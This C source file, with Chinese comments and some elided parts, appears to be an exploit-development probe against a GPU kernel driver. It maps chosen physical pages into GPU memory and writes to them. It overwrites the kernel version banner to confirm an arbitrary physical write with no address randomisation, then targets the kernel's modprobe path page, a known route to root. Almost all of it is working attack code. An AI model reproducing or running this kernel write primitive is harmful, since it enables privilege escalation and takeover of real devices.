/*
 * kort_probe3.c - WB 地址对齐特性 + banner 重测
 *
 * 1. ALLOC 页自测: 32B 窗口写 +0x3008 / +0x3078 / +0x3200 (不同值),
 *    dump 0x3000-0x3280 看实际落点 => 确定对齐规则
 * 2. BIND banner 页, 256B 窗口写在页首 VA+0x0 (0x200 对齐),
 *    覆盖 [0x00,0x100) 含 banner@0x78 => 读 /proc/version
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
...
static void dump(const char *tag, volatile uint32_t *p, int words) {
    printf("%s:\n", tag);
...
int main(void) {
    ...
    printf("[*] kort_probe3 - WB alignment characterization + banner retest\n");
    ...
    /* ---- 1. ALLOC 页对齐自测 ---- */
    memset((char*)buf + 0x3000, 0, 0x400);
    __builtin___clear_cache((char*)buf, (char*)buf + BUF_SIZE);

    printf("\n[S1] 32B window @ +0x3008 = 0xAABBCC01\n");
    wb_write_wh(fd, (uint32_t*)buf, GPU_VA_DATA + 0x3008, 0xAABBCC01, 0x10, 0x4);
    printf("[S2] 32B window @ +0x3078 = 0xAABBCC02\n");
    wb_write_wh(fd, (uint32_t*)buf, GPU_VA_DATA + 0x3078, 0xAABBCC02, 0x10, 0x4);
    printf("[S3] 32B window @ +0x3200 = 0xAABBCC03\n");
    wb_write_wh(fd, (uint32_t*)buf, GPU_VA_DATA + 0x3200, 0xAABBCC03, 0x10, 0x4);
    dump("after S1-S3 (+0x3000..0x3280)",
         (volatile uint32_t*)((char*)buf + 0x3000), 0x280 / 4);

    /* ---- 2. BIND banner 页, 256B 窗口页首对齐 ---- */
    printf("\n[B1] BIND PA 0x01DC0000, 256B window @ page+0x0 (covers banner@0x78)\n");
    {
        const uint32_t VA = 0x41000000;
        if (bind_phys(fd, 0x01DC0000u, VA, 0x1000) == 0) {
            wb_write_wh(fd, (uint32_t*)buf, VA + 0x0, 0x2F2F2F2F, 0x10, 0x20);
            flush_cpu_cache();
            char v[80];
            read_file("/proc/version", v, sizeof(v));
            printf("  version after: %.48s\n", v);
            if (strncmp(v, "////", 4) == 0)
                printf("  [+] *** BANNER CHANGED => slide=0 + BIND write works ***\n");
            else
                printf("  [-] unchanged\n");
        } else printf("  [-] bind failed\n");
    }

    /* ---- 3. BIND modprobe 页 (slide=0), 32B 写 @ +0xf960 也对齐检查 ---- */
    printf("\n[B2] BIND PA 0x027DF000, 256B window @ page+0xf800 (covers modprobe@0xf960)\n");
    {
        const uint32_t VA = 0x41100000;
        if (bind_phys(fd, 0x027DF000u, VA, 0x1000) == 0) {
            wb_write_wh(fd, (uint32_t*)buf, VA + 0xF800, 0x78787878, 0x10, 0x20);
            flush_cpu_cache();
            char v[80];
            int rc = read_file("/proc/sys/kernel/modprobe", v, sizeof(v));
            printf("  modprobe after (rc=%d): '%s'\n", rc, v);
        }
    }
